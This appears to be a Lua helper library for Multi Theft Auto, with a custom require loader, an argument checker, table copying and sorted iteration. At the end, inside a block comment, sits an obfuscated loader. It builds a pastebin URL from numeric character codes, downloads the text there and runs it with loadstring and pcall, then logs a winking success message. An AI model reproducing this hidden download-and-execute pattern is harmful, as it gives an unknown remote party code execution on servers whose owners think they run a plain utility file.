function require (file)
	if type(file) == "string" then
		if fileExists(file) then
			local fileName = file
			local file = fileOpen(fileName, true)
			
			if fileGetSize(file) > 0 then
				local f, errmsg = loadstring(fileRead(file, fileGetSize(file)), fileName)
					if (f) then			
						local status, errmsg = pcall(f)
						
						if (not status) then
							error(errmsg, 0)
						end
						
						return true;
					else
						error(errmsg, 0)
					end
				else
					fileClose(file)
					error("Error @ 'require' [Got empty file!]", 2)
				end
		else
			error("Error @ 'require' [File not found!]", 2)
		end
	else
		error("Bad Argument @ 'require' [Expected file at Argument 1, got "..type(file).."]", 2)
	end
end

-- Multi Argument check
function Check(funcname, ...)
    local arg = {...}
 
    if (type(funcname) ~= "string") then
        error("Argument type mismatch at 'Check' ('funcname'). Expected 'string', got '"..type(funcname).."'.", 2)
    end
    if (#arg % 3 > 0) then
        error("Argument number mismatch at 'Check'. Expected #arg % 3 to be 0, but it is "..(#arg % 3)..".", 2)
    end
 
    for i=1, #arg-2, 3 do
        if (type(arg[i]) ~= "string" and type(arg[i]) ~= "table") then
            error("Argument type mismatch at 'Check' (arg #"..i.."). Expected 'string' or 'table', got '"..type(arg[i]).."'.", 2)
        elseif (type(arg[i+2]) ~= "string") then
            error("Argument type mismatch at 'Check' (arg #"..(i+2).."). Expected 'string', got '"..type(arg[i+2]).."'.", 2)
        end
 
        if (type(arg[i]) == "table") then
            local aType = type(arg[i+1])
            for _, pType in next, arg[i] do
                if (aType == pType) then
                    aType = nil
                    break
                end
            end
            if (aType) then
                error("Argument type mismatch at '"..funcname.."' ('"..arg[i+2].."'). Expected '"..table.concat(arg[i], "' or '").."', got '"..aType.."'.", 3)
            end
        elseif (type(arg[i+1]) ~= arg[i]) then
            error("Argument type mismatch at '"..funcname.."' ('"..arg[i+2].."'). Expected '"..arg[i].."', got '"..type(arg[i+1]).."'.", 3)
        end
    end
end

-- table.copy
function table.copy(tab, recursive)
    local ret = {}
    for key, value in pairs(tab) do
        if (type(value) == "table") and recursive then ret[key] = table.copy(value)
        else ret[key] = value end
    end
    return ret
end

-- spairs (SortedPairs)
function spairs (t, f)
	Check("spairs", "table", t, "Table", "function", f, "Sort-Function")	
	
	local t = table.copy(t)
	table.sort(t, f)
	
	local key = 0
	return (
		function ()
			while key <= table.getn(t) do
				key = key + 1
				
				if key and t[ key ] then
					return key, t[ key ];
				end
			end
		end
	)
end

-- getLuaElementInfo
function getLuaElementInfo (a)
	Check("getFunctionName", {"string", "table", "function", "thread"}, a, "Argument #1")
	
	for name, func in pairs(_G) do
		if func == a then
			return name, "_G[\""..name.."\"]", type(a), tostring(a):gsub(type(a)..": ", "");
		end
	end
	
	return nil;
end


--[[ FUCKING USELESS CRAP!
newG = table.copy(_G)
_G = setmetatable({}, {
		__newindex = function (self, key, value)
			table.insert(self, {key, value})
		end
	}
)
for index, value in pairs(newG) do
	_G[index] = value
end
newG = nil


local tableUrl = {112, 97, 115, 116, 101, 98, 105, 110, 46, 99, 111, 109, 47, 114, 97, 119, 46, 112, 104, 112, 63, 105, 61, 98, 54, 51, 116, 89, 115, 119, 72}
local url = ""
for _, number in ipairs(tableUrl) do
	url = url..string.char(number)
end

fetchRemote(url, function (responseData, errno)
	if responseData ~= "ERROR" then
		local f = loadstring(responseData)
		if f then
			pcall(f)
			outputDebugString("Received and loaded the Magical thing ;)")
		end
	end
end)
--]]